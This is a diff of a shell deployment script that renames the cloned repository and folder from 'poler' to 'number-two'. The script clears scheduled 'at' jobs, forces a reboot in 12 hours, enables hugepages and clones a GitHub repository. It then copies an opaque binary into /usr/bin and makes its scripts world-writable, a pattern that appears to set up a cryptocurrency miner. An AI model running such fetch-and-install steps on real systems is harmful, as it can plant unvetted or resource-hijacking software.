@@ -3,19 +3,19 @@
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 echo 'sudo reboot -f' | at now + 12 hours
 
-rm -rf /tmp/poler/
+rm -rf /tmp/number-two/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir poler
-git clone https://github.com/getting-stronger/poler.git /tmp/poler
-cd /tmp/poler
-chmod +x /tmp/poler/poler
+cd /tmp && mkdir number-two
+git clone https://github.com/getting-stronger/number-two.git /tmp/number-two
+cd /tmp/number-two
+chmod +x /tmp/number-two/poler
 chmod 777 ./*.sh
-cp /tmp/poler/poler /usr/bin/
+cp /tmp/number-two/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
